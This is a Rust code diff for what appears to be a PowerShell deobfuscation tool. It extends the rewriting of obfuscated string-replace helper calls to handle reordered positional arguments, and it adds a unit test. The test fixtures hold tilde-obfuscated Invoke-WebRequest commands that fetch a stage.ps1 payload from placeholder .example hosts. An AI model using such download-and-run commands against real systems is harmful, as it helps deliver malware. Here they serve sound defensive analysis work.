@@ -3816,6 +3816,7 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
             let binding = PsReplaceExtractorParamBinding {
                 value_idx,
                 value_name: value_var,
+                arg_count: param_index.len(),
                 needle_idx,
                 needle_name: needle_var,
                 repl_idx,
@@ -5298,50 +5299,17 @@ fn inline_ps_literal_replace_calls(
                     continue;
                 }
             }
-            let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value, needle, repl)) =
+                parse_ps_positional_literal_replace_args(text, pos, parenthesized, binding)
+            else {
                 search_from = end_name;
                 continue;
             };
-            if first.len() > 8192 {
-                search_from = first_end;
-                continue;
-            }
-            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-            let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
-                search_from = first_end;
-                continue;
-            };
-            pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
-            let Some((third_end, third)) = parse_ps_static_quoted_literal(text, pos) else {
-                search_from = second_end;
-                continue;
-            };
-            let mut call_end = third_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = third_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-
-            let args = [&first, &second, &third];
-            if binding.value_idx >= args.len()
-                || binding.needle_idx >= args.len()
-                || binding.repl_idx >= args.len()
-            {
-                search_from = call_end;
-                continue;
-            }
-            let value = args[binding.value_idx];
-            let needle = args[binding.needle_idx];
-            let repl = args[binding.repl_idx];
             if needle.is_empty() {
                 search_from = call_end;
                 continue;
             }
-            let replaced = value.replace(needle, repl);
+            let replaced = value.replace(&needle, &repl);
             if replaced.len() > 8192 {
                 search_from = call_end;
                 continue;
@@ -5364,10 +5332,60 @@ fn inline_ps_literal_replace_calls(
 struct PsReplaceExtractorParamBinding<'a> {
     value_idx: usize,
     value_name: &'a str,
+    arg_count: usize,
     needle_idx: usize,
     needle_name: &'a str,
     repl_idx: usize,
     repl_name: &'a str,
+}
+
+fn parse_ps_positional_literal_replace_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    binding: PsReplaceExtractorParamBinding<'_>,
+) -> Option<(usize, String, String, String)> {
+    if binding.arg_count == 0
+        || binding.arg_count > 8
+        || binding.value_idx >= binding.arg_count
+        || binding.needle_idx >= binding.arg_count
+        || binding.repl_idx >= binding.arg_count
+    {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut value = None;
+    let mut needle = None;
+    let mut repl = None;
+    let mut arg_end = pos;
+    for idx in 0..binding.arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == binding.value_idx {
+            value = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.needle_idx {
+            needle = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.repl_idx {
+            repl = Some(arg.as_str()?.to_string());
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < binding.arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    Some((arg_end, value?, needle?, repl?))
 }
 
 fn inline_ps_named_literal_replace_call(
@@ -9459,6 +9477,23 @@ Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-replace-extractor.example/stage.ps1'"),
             "replace extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_replace_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Clean($unused,$value,$needle,$replacement) {
+  return $value -replace $needle,$replacement
+}
+Clean 0 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~o~r~d~e~r~e~d~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;
+
+        let out = expand_literal_replace_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-reordered-replace-extractor.example/stage.ps1'"
+            ),
+            "reordered replace extractor call was not rewritten:\n{out}"
         );
     }
 
